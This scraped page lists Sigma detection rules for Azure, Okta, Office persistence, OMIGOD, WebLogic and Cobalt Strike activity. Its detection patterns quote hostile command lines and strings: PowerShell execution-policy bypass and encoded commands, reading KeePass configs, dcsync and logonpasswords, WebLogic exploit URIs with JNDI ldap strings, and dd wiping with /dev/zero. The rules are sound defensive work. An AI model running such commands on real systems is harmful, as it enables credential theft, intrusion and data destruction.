<li><a href="#">title:Number Of Resource Creation Or Deployment Activities id: d2d901db-7a75-45a1-bc39-0cbf00812192 status: test description: Number of VM creations or deployment activities occur in Azure via the azureactivity log. author: sawwinnnaung references: - date: 2020/05/07 modified: 2021/11/27 logsource: product: azure service: azureactivity detection: keywords: - Microsoft.Compute/virtualMachines/write - Microsoft.Resources/deployments/write condition: keywords falsepositives: - Valid change level: medium tags: - attack.t1098 
<li><a href="#">title:Obfuscated Command Line Using Special Unicode Characters id: e0552b19-5a83-4222-b141-b36184bb8d79 status: experimental description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. author: frack113 references: - - date: 2022/01/15 logsource: category: process_creation product: windows detection: selection: #find the sysmon event CommandLine|contains: - 'Ã¢' - 'â‚¬' - 'Â£' - 'Â¯' - 'Â®' - 'Âµ' - 'Â¶' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 
<li><a href="#">title:OceanLotus Registry Activity id: 4ac5fc44-a601-4c06-955b-309df8c4e9d4 status: experimental description: Detects registry keys created in OceanLotus (also known as APT32) attacks references: - - tags: - attack.defense_evasion - attack.t1112 author: megan201296, Jonhnathan Ribeiro date: 2019/04/14 modified: 2021/09/17 logsource: category: registry_event product: windows detection: selection_ioc1: TargetObject: 'HKCU\SOFTWARE\Classes\CLSID\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\Model' selection_ioc2: TargetObject|startswith: - HKCU\SOFTWARE\App\ - HKLM\SOFTWARE\App\ TargetObject|contains: - AppXbf13d4ea2945444d8b13e2121cb6b663\ - AppX70162486c7554f7f80f481985d67586d\ - AppX37cc7fdccd644b4f85f4b22d5a3f105a\ TargetObject|endswith: - Application - DefaultIcon selection_hkcu: TargetObject|startswith: 'HKCU\' TargetObject|contains: # HKCU\SOFTWARE\Classes\AppXc52346ec40fb4061ad96be0e6cb7d16a\ - 'Classes\AppXc52346ec40fb4061ad96be0e6cb7d16a\' # HKCU\SOFTWARE\Classes\AppX3bbba44c6cae4d9695755183472171e2\ - 'Classes\AppX3bbba44c6cae4d9695755183472171e2\' # HKCU\SOFTWARE\Classes\CLSID\{E3517E26-8E93-458D-A6DF-8030BC80528B}\ - 'Classes\CLSID\{E3517E26-8E93-458D-A6DF-8030BC80528B}\' - 'Classes\CLSID\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\Model' condition: 1 of selection* falsepositives: - Unknown level: critical 
<li><a href="#">title:Octopus Scanner Malware id: 805c55d9-31e6-4846-9878-c34c75054fe9 status: test description: Detects Octopus Scanner Malware. author: NVISO references: - date: 2020/06/09 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: - '\AppData\Local\Microsoft\Cache134.dat' - '\AppData\Local\Microsoft\ExplorerSync.db' condition: selection falsepositives: - Unknown level: high tags: - attack.t1195 - attack.t1195.001 
<li><a href="#">title:Office Application Startup - Office Test id: 3d27f6dd-1c74-4687-b4fa-ca849d128d1c status: experimental description: Detects the addition of office test registry that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started references: - author: omkar72 tags: - attack.persistence - attack.t1137.002 date: 2020/10/25 modified: 2021/09/13 logsource: category: registry_event product: windows detection: selection_registry: TargetObject: - 'HKCU\Software\Microsoft\Office test\Special\Perf' - 'HKLM\Software\Microsoft\Office test\Special\Perf' condition: selection_registry falsepositives: - Unlikely level: medium 
<li><a href="#">title:Office Applications Spawning Wmi Cli id: 04f5363a-6bca-42ff-be70-0d28bf629ead description: Initial execution of malicious document calls wmic to execute the file with regsvr32 references: - - (aka_REvil)_Ransomware.yaml author: 'Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)' tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2022/06/16 logsource: product: windows category: process_creation detection: #useful_information: Add more office applications to the rule logic of choice selection1: - Image|endswith: '\wbem\WMIC.exe' - CommandLine|contains: 'wmic ' selection2: ParentImage|endswith: - '\winword.exe' - '\excel.exe' - '\powerpnt.exe' - '\msaccess.exe' - '\mspub.exe' - '\eqnedt32.exe' - '\visio.exe' condition: selection1 and selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:Office Applications Spawning Wmi Cli id: 518643ba-7d9c-4fa5-9f37-baed36059f6a description: Initial execution of malicious document calls wmic to execute the file with regsvr32 references: - - (aka_REvil)_Ransomware.yaml author: 'Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)' tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2022/06/02 logsource: product: windows category: process_creation detection: #useful_information: Add more office applications to the rule logic of choice selection_img: - Image|endswith: '\wbem\WMIC.exe' - OriginalFileName: 'wmic.exe' selection_parent: ParentImage|endswith: - '\winword.exe' - '\excel.exe' - '\powerpnt.exe' condition: all of selection_* falsepositives: - Unknown level: high 
<li><a href="#">title:Office Autorun Keys Modification id: baecf8fb-edbf-429f-9ade-31fc3f22b970 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/06/10 logsource: category: registry_set product: windows detection: office: EventType: SetValue TargetObject|contains: - '\Software\Wow6432Node\Microsoft\Office' - '\Software\Microsoft\Office' office_details: TargetObject|contains: - '\Word\Addins' - '\PowerPoint\Addins' - '\Outlook\Addins' - '\Onenote\Addins' - '\Excel\Addins' - '\Access\Addins' - 'test\Special\Perf' filter_empty: Details: '(Empty)' filter_excel: # known addins for excel TargetObject|contains: - '\Excel\Addins\AdHocReportingExcelClientLib.AdHocReportingExcelClientAddIn.1\' - '\Excel\Addins\ExcelPlugInShell.PowerMapConnect\' - '\Excel\Addins\NativeShim\' - '\Excel\Addins\NativeShim.InquireConnector.1\' - '\Excel\Addins\PowerPivotExcelClientAddIn.NativeEntry.1\' filter_outlook: # known addins for outlook TargetObject|contains: - '\Outlook\AddIns\AccessAddin.DC\' - '\Outlook\AddIns\ColleagueImport.ColleagueImportAddin\' - '\Outlook\AddIns\EvernoteCC.EvernoteContactConnector\' - '\Outlook\AddIns\EvernoteOLRD.Connect\' - '\Outlook\Addins\Microsoft.VbaAddinForOutlook.1\' - '\Outlook\Addins\OcOffice.OcForms\' - '\Outlook\Addins\OscAddin.Connect\' - '\Outlook\Addins\OutlookChangeNotifier.Connect\' - '\Outlook\Addins\UCAddin.LyncAddin.1' - '\Outlook\Addins\UCAddin.UCAddin.1' - '\Outlook\Addins\UmOutlookAddin.FormRegionAddin\' filter_officeclicktorun: Image|startswith: - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\' - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\' Image|endswith: '\OfficeClickToRun.exe' filter_avg: Image: 'C:\Program Files\AVG\Antivirus\RegSvr.exe' TargetObject|contains: '\Microsoft\Office\Outlook\Addins\Antivirus.AsOutExt\' condition: office and office_details and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Office Directory Traversal CommandLine id: 868955d9-697e-45d4-a3da-360cefd7c216 status: experimental description: Detects Office Applications executing a Windows child process including directory traversal patterns references: - author: '@SBousseaden (idea), Christian Burkard (rule)' tags: - attack.execution - attack.defense_evasion date: 2022/06/02 logsource: product: windows category: process_creation detection: selection: ParentImage|endswith: - '\winword.exe' - '\excel.exe' - '\powerpnt.exe' - '\msaccess.exe' - '\mspub.exe' - '\eqnedt32.exe' - '\visio.exe' Image|contains: - '\Windows\System32\' - '\Windows\SysWOW64\' CommandLine: - '../../../..' - '..\..\..\..' - '..//..//..//..' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Office Security Settings Changed id: a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd status: experimental description: Detects registry changes to Office macro settings. The TrustRecords contain information on executed macro-enabled documents. (see references) author: Trent Liffick (@tliffick) date: 2020/05/22 modified: 2022/06/26 references: - - - logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject|endswith: - '\Security\Trusted Documents\TrustRecords' - '\Security\AccessVBOM' - '\Security\VBAWarnings' condition: selection falsepositives: - Valid Macros and/or internal documents level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Office Template Creation id: 0e20c89d-2264-44ae-8238-aeeaba609ece status: experimental description: Detects creation of template files for Microsoft Office from outside Office author: Max Altgelt date: 2022/06/02 references: - tags: - attack.persistence - attack.t1137 logsource: category: file_event product: windows detection: selection_word: TargetFilename|endswith: - .dot - .dotm - .doc - .docm - .docx - .rtf TargetFilename|contains: '\Microsoft\Word\Startup' selection_excel: TargetFilename|endswith: - .xlt - .xltm - .xls - .xlsm - .xlsx TargetFilename|contains: '\Microsoft\Excel\Startup' filter_office: Image|endswith: - \WINWORD.exe - \EXCEL.exe condition: 1 of selection* and not filter_office falsepositives: - Loading a user environment from a backup or a domain controller - Synchronization of templates level: high 
<li><a href="#">title:Okta Admin Role Assigned to an User or Group id: 413d4a81-6c98-4479-9863-014785fd579c description: Detects when an the Administrator role is assigned to an user or group. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: - group.privilege.grant - user.account.privilege.grant condition: selection level: medium tags: - attack.impact falsepositives: - Administrator roles could be assigned to users or group by other admin users. 
<li><a href="#">title:Okta API Token Created id: 19951c21-229d-4ccb-8774-b993c3ff3c5c description: Detects when a API token is created author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: system.api_token.create condition: selection level: medium tags: - attack.persistence falsepositives: - Unknown 
<li><a href="#">title:Okta API Token Revoked id: cf1dbc6b-6205-41b4-9b88-a83980d2255b description: Detects when a API Token is revoked. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: system.api_token.revoke condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Okta Application Modified or Deleted id: 7899144b-e416-4c28-b0b5-ab8f9e0a541d description: Detects when an application is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: - application.lifecycle.update - application.lifecycle.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Okta Application Sign-On Policy Modified or Deleted id: 8f668cc4-c18e-45fe-ad00-624a981cf88a description: Detects when an application Sign-on Policy is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: - application.policy.sign_on.update - application.policy.sign_on.rule.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Okta MFA Reset or Deactivated id: 50e068d7-1e6b-4054-87e5-0a592c40c7e0 description: Detects when an attempt at deactivating or resetting MFA. author: Austin Songer @austinsonger status: experimental date: 2021/09/21 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: - user.mfa.factor.deactivate - user.mfa.factor.reset_all condition: selection level: medium tags: - attack.persistence falsepositives: - If a MFA reset or deactivated was performed by a system administrator. 
<li><a href="#">title:Okta Network Zone Deactivated or Deleted id: 9f308120-69ed-4506-abde-ac6da81f4310 description: Detects when an Network Zone is Deactivated or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: - zone.deactivate - zone.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Okta Policy Modified or Deleted id: 1667a172-ed4c-463c-9969-efd92195319a description: Detects when an Okta policy is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: - policy.lifecycle.update - policy.lifecycle.delete condition: selection level: low tags: - attack.impact falsepositives: - Okta Policies being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Okta Policies modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Okta Policy Rule Modified or Deleted id: 0c97c1d3-4057-45c9-b148-1de94b631931 description: Detects when an Policy Rule is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: eventtype: - policy.rule.update - policy.rule.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Okta Security Threat Detected id: 5c82f0b9-3c6d-477f-a318-0e14a1df73e0 description: Detects when an security threat is detected in Okta. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - - logsource: product: okta service: okta detection: selection: eventtype: security.threat.detected condition: selection level: medium falsepositives: - Unknown 
<li><a href="#">title:Okta Unauthorized Access to App id: 6cc2b61b-d97e-42ef-a9dd-8aa8dc951657 description: Detects when unauthorized access to app occurs. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: displaymessage: User attempted unauthorized access to app condition: selection level: medium tags: - attack.impact falsepositives: - User might of believe that they had access. 
<li><a href="#">title:Okta User Account Locked Out id: 14701da0-4b0f-4ee6-9c95-2ffb4e73bb9a description: Detects when an user account is locked out. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - - logsource: product: okta service: okta detection: selection: displaymessage: Max sign in attempts exceeded condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:OMIGOD HTTP No Authentication RCE id: ab6b1a39-a9ee-4ab4-b075-e83acf6e346b description: Detects the exploitation of OMIGOD (CVE-2021-38647) which allows remote execute (RCE) commands as root with just a single unauthenticated HTTP request. Verify, successful, exploitation by viewing the HTTP client (request) body to see what was passed to the server (using PCAP). Within the client body is where the code execution would occur. Additionally, check the endpoint logs to see if suspicious commands or activity occurred within the timeframe of this HTTP request. author: Nate Guagenti (neu5ron) date: 2021/09/20 modified: 2019/09/20 references: - - tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.lateral_movement - attack.t1068 - attack.t1190 - attack.t1203 - attack.t1021.006 - attack.t1210 logsource: product: zeek service: http definition: Enable the builtin Zeek script that logs all HTTP header names by adding "@load policy/protocols/http/header-names" to your local.zeek config file. The script can be seen here for reference detection: selection: status_code: 200 uri: /wsman method: POST auth_header: client_header_names|contains: 'AUTHORIZATION' too_small_http_client_body: request_body_len: 0 #winrm_ports: # id.resp_p: # - 5985 # - 5986 # - 1270 condition: selection and not auth_header and not too_small_http_client_body #condition: selection and winrm_ports and not auth_header and not too_small_http_client_body # Enable this to only perform search on default WinRM ports, however those ports are sometimes changed and therefore this is disabled by default to give a broader coverage of this rule falsepositives: - Exploits that were attempted but unsuccessful. - Scanning attempts with the abnormal use of the HTTP POST method with no indication of code execution within the HTTP Client (Request) body. An example would be vulnerability scanners trying to identify unpatched versions while not actually exploiting the vulnerability. See description for investigation tips. level: high fields: - id.orig_h - id.resp_h - id.resp_p - status_code - method - uri - request_body_len - response_body_len - user_agent status: stable 
<li><a href="#">title:OMIGOD SCX RunAsProvider ExecuteScript id: 6eea1bf6-f8d2-488a-a742-e6ef6c1b67db status: experimental description: Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell. Script being executed gets created as a temp file in /tmp folder with a scx* prefix. Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/. The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.t1068 - attack.t1190 - attack.t1203 references: - - - logsource: product: linux category: process_creation detection: selection: User: root LogonId: '0' CurrentDirectory: '/var/opt/microsoft/scx/tmp' CommandLine|contains: '/etc/opt/microsoft/scx/conf/tmpdir/scx' condition: selection falsepositives: - Legitimate use of SCX RunAsProvider ExecuteScript. level: high 
<li><a href="#">title:OMIGOD SCX RunAsProvider ExecuteShellCommand id: 045b5f9c-49f7-4419-a236-9854fb3c827a description: Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite. status: experimental date: 2021/09/17 modified: 2021/11/11 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.t1068 - attack.t1190 - attack.t1203 references: - - logsource: product: linux service: auditd detection: selection: type: 'SYSCALL' syscall: 'execve' uid: '0' cwd: '/var/opt/microsoft/scx/tmp' comm: 'sh' condition: selection falsepositives: - Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand. level: high 
<li><a href="#">title:OMIGOD SCX RunAsProvider ExecuteShellCommand id: 21541900-27a9-4454-9c4c-3f0a4240344a status: experimental description: Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.t1068 - attack.t1190 - attack.t1203 references: - - - logsource: product: linux category: process_creation detection: selection: User: root LogonId: '0' CurrentDirectory: '/var/opt/microsoft/scx/tmp' CommandLine|contains: '/bin/sh' condition: selection falsepositives: - Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand. level: high 
<li><a href="#">title:OneLogin User Account Locked id: a717c561-d117-437e-b2d9-0118a7035d01 description: Detects when an user acount is locked or suspended. author: Austin Songer @austinsonger status: experimental date: 2021/10/12 modified: 2021/10/12 references: - logsource: product: onelogin service: onelogin.events detection: selection1: # Locked via API event_type_id: 532 selection2: # Locked via API event_type_id: 553 selection3: # Suspended via API event_type_id: 551 condition: 1 of selection* level: low tags: - attack.impact falsepositives: - System may lock or suspend user accounts. 
<li><a href="#">title:OneLogin User Assumed Another User id: 62fff148-278d-497e-8ecd-ad6083231a35 description: Detects when an user assumed another user account. author: Austin Songer @austinsonger status: experimental date: 2021/10/12 modified: 2021/10/12 references: - logsource: product: onelogin service: onelogin.events detection: selection: event_type_id: 3 condition: selection level: low tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:OpenWith.exe Executes Specified Binary id: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f status: test description: The OpenWith.exe executes other binary author: Beyu Denis, oscd.community (rule), @harr0ey (idea) references: - - date: 2019/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\OpenWith.exe' CommandLine|contains: '/c' condition: selection falsepositives: - Legitimate use of OpenWith.exe by legitimate user level: high tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Operation Wocao Activity id: 1cfac73c-be78-4f9a-9b08-5bde0c3953ab related: - id: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d type: derived author: Florian Roth, frack113 status: experimental description: Detects activity mentioned in Operation Wocao report references: - - tags: - attack.discovery - attack.t1012 - attack.defense_evasion - attack.t1036.004 - attack.t1027 - attack.execution - attack.t1053.005 - attack.t1059.001 date: 2019/12/20 modified: 2021/09/19 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'checkadmin.exe 127.0.0.1 -all' - 'netsh advfirewall firewall add rule name=powershell dir=in' - 'cmd /c powershell.exe -ep bypass -file c:\s.ps1' - '/tn win32times /f' - 'create win32times binPath=' - '\c$\windows\system32\devmgr.dll' - ' -exec bypass -enc JgAg' - 'type *keepass\KeePass.config.xml' - 'iie.exe iie.txt' - 'reg query HKEY_CURRENT_USER\Software\\*\PuTTY\Sessions\' condition: selection falsepositives: - Administrators that use checkadmin.exe tool to enumerate local administrators level: high 
<li><a href="#">title:Operation Wocao Activity id: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d author: Florian Roth, frack113 status: experimental description: Detects activity mentioned in Operation Wocao report references: - - tags: - attack.discovery - attack.t1012 - attack.defense_evasion - attack.t1036.004 - attack.t1027 - attack.execution - attack.t1053.005 - attack.t1059.001 date: 2019/12/20 modified: 2021/09/19 logsource: product: windows service: security detection: selection: EventID: 4799 TargetUserName|startswith: 'Administr' CallerProcessName|endswith: '\checkadmin.exe' condition: selection falsepositives: - Administrators that use checkadmin.exe tool to enumerate local administrators level: high 
<li><a href="#">title:Operator Bloopers Cobalt Strike Commands status: experimental id: 647c7b9e-d784-4fda-b9a0-45c565a7b729 description: Detects use of Cobalt Strike commands accidentally entered in the CMD shell author: _pete_0, TheDFIRReport references: - - - date: 2022/05/06 modified: 2022/05/06 logsource: category: process_creation product: windows detection: selection: CommandLine|startswith: - 'cmd.exe' - 'c:\windows\system32\cmd.exe' CommandLine|contains: - psinject - spawnas - make_token - remote-exec - rev2self - dcsync - logonpasswords - execute-assembly - getsystem Image|endswith: '\cmd.exe' condition: selection fields: - CommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.003 
<li><a href="#">title:Operator Bloopers Cobalt Strike Modules status: experimental id: 4f154fb6-27d1-4813-a759-78b93e0b9c48 description: Detects use of Cobalt Strike module commands accidentally entered in the CMD shell author: _pete_0, TheDFIRReport references: - - - date: 2022/05/06 modified: 2022/05/06 logsource: category: process_creation product: windows detection: selection: CommandLine|startswith: - 'cmd.exe' - 'c:\windows\system32\cmd.exe' CommandLine|contains: - Invoke-UserHunter - Invoke-ShareFinder - Invoke-Kerberoast - Invoke-SMBAutoBrute - Invoke-Nightmare - zerologon - av_query Image|endswith: '\cmd.exe' condition: selection fields: - CommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.003 
<li><a href="#">title:Oracle WebLogic Exploit CVE-2020-14882 id: 85d466b0-d74c-4514-84d3-2bdd3327588b status: test description: Detects exploitation attempts on WebLogic servers author: Florian Roth references: - - - date: 2020/11/02 modified: 2021/11/27 logsource: category: webserver detection: selection: c-uri|contains: - '/console/images/%252E%252E%252Fconsole.portal' - '/console/css/%2e' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.t1190 - attack.initial_access - cve.2020.14882 
<li><a href="#">title:Oracle WebLogic Exploit CVE-2021-2109 id: 687f6504-7f44-4549-91fc-f07bab065821 status: experimental description: Detects the exploitation of the WebLogic server vulnerability described in CVE-2021-2109 author: Bhabesh Raj date: 2021/01/20 references: - - logsource: category: webserver detection: selection: cs-method: 'GET' c-uri|contains|all: - 'com.bea.console.handles.JndiBindingHandle' - 'ldap://' - 'AdminServer' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.t1190 - attack.initial_access - cve.2021.2109 
<li><a href="#">title:Oracle WebLogic Exploit id: 37e8369b-43bb-4bf8-83b6-6dd43bda2000 status: experimental description: Detects access to a webshell dropped into a keystore folder on the WebLogic server author: Florian Roth date: 2018/07/22 modified: 2021/08/09 references: - - logsource: category: webserver detection: selection: c-uri: '*/config/keystore/*.js*' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.t1190 - attack.initial_access - attack.persistence - attack.t1505.003 - cve.2018.2894 
<li><a href="#">title:Outgoing Logon with New Credentials id: def8b624-e08f-4ae1-8612-1ba21190da6b status: experimental description: Detects logon events that specify new credentials references: - author: Max Altgelt date: 2022/04/06 logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 9 condition: selection falsepositives: - Legitimate remote administration activity level: low 
<li><a href="#">title:Outlook C2 Macro Creation id: 8c31f563-f9a7-450c-bfa8-35f8f32f1f61 status: experimental description: Detects the creation of a macro file for Outlook. Goes with win_outlook_c2_registry_key. VbaProject.OTM is explicitly mentioned in T1137. Particularly interesting if both events Registry & File Creation happens at the same time. references: - author: '@ScoubiMtl' tags: - attack.persistence - attack.command_and_control - attack.t1137 - attack.t1008 - attack.t1546 date: 2021/04/05 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: '\Microsoft\Outlook\VbaProject.OTM' condition: selection falsepositives: - User genuinly creates a VB Macro for their email level: medium 
<li><a href="#">title:Outlook C2 Registry Key id: e3b50fa5-3c3f-444e-937b-0a99d33731cd status: experimental description: Detects the modification of Outlook Security Setting to allow unprompted execution. Goes with win_outlook_c2_macro_creation.yml and is particularly interesting if both events occur near to each other. references: - author: '@ScoubiMtl' date: 2021/04/05 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection_registry: EventType: SetValue TargetObject: 'HKCU\Software\Microsoft\Office\16.0\Outlook\Security\Level' Details|contains: '0x00000001' condition: selection_registry falsepositives: - Unlikely level: medium tags: - attack.persistence - attack.command_and_control - attack.t1137 - attack.t1008 - attack.t1546 
<li><a href="#">title:Outlook Form Installation id: c3edc6a5-d9d4-48d8-930e-aab518390917 status: experimental description: Detects the creation of new Outlook form which can contain malicious code references: - tags: - attack.persistence - attack.t1137.003 author: Tobias Michalski date: 2021/06/10 modified: 2022/06/16 logsource: product: windows category: file_event detection: selection: Image|endswith: '\outlook.exe' TargetFilename|contains: '\appdata\local\microsoft\FORMS\' condition: selection fields: - TargetFilename falsepositives: - Unknown level: high 
<li><a href="#">title:Overwrite Deleted Data with Cipher id: 4b046706-5789-4673-b111-66f25fe99534 status: experimental description: | Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives author: frack113 date: 2021/12/26 references: - logsource: category: process_creation product: windows detection: selection: Image|endswith: \cipher.exe CommandLine|contains: ' /w:' condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1485 
<li><a href="#">title:Overwriting the File with Dev Zero or Null id: 37222991-11e9-4b6d-8bdf-60fbe48f753e status: stable description: Detects overwriting (effectively wiping/deleting) of a file. author: Jakob Weinzettl, oscd.community date: 2019/10/23 references: - logsource: product: linux service: auditd detection: selection: type: 'EXECVE' a0|contains: 'dd' a1|contains: - 'if=/dev/null' - 'if=/dev/zero' condition: selection falsepositives: - Appending null bytes to files. - Legitimate overwrite of files. level: low tags: - attack.impact - attack.t1485 
<li><a href="#">title:Pandemic Registry Key id: 47e0852a-cf81-4494-a8e6-31864f8c86ed status: experimental description: Detects Pandemic Windows Implant references: - - tags: - attack.lateral_movement - attack.t1105 author: Florian Roth date: 2017/06/01 modified: 2021/09/12 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: '\SYSTEM\CurrentControlSet\services\null\Instance' condition: selection falsepositives: - Unknown level: critical fields: - EventID - CommandLine - ParentCommandLine - Image - User - TargetObject 
<li><a href="#">title:Parent in Public Folder Suspicious Process id: 69bd9b97-2be2-41b6-9816-fb08757a4d1a status: experimental description: This rule detects suspicious processes with parent images located in the C:\Users\Public folder author: Florian Roth references: - date: 2022/02/25 logsource: category: process_creation product: windows detection: selection: ParentImage|startswith: 'C:\Users\Public\' CommandLine|contains: - 'powershell' - 'cmd.exe /c ' - 'cmd /c ' - 'wscript.exe' - 'cscript.exe' - 'bitsadmin' - 'certutil' - 'mshta.exe' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Pass the Hash Activity 2 id: 8eef149c-bd26-49f2-9e5a-9b00e3af499b status: stable description: Detects the attack technique pass the hash which is used to move laterally inside the network references: - - - author: Dave Kennedy, Jeff Warren (method) / David Vassallo (rule) date: 2019/06/14 tags: - attack.lateral_movement - attack.t1550.002 logsource: product: windows service: security definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624 detection: selection: - EventID: 4624 SubjectUserSid: 'S-1-0-0' LogonType: '3' LogonProcessName: 'NtLmSsp' KeyLength: '0' - EventID: 4624 LogonType: '9' LogonProcessName: 'seclogo' filter: TargetUserName: 'ANONYMOUS LOGON' condition: selection and not filter falsepositives: - Administrator activity level: medium 
<li><a href="#">title:Pass the Hash Activity id: f8d98d6c-7a07-4d74-b064-dd4a3c244528 status: test description: Detects the attack technique pass the hash which is used to move laterally inside the network author: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method) references: - date: 2017/03/08 modified: 2021/11/27 logsource: product: windows service: security definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625 detection: selection: EventID: - 4624 - 4625 LogonType: '3' LogonProcessName: 'NtLmSsp' WorkstationName: '%Workstations%' ComputerName: '%Workstations%' filter: TargetUserName: 'ANONYMOUS LOGON' condition: selection and not filter falsepositives: - Administrator activity level: medium tags: - attack.lateral_movement - car.2016-04-004 - attack.t1550.002 
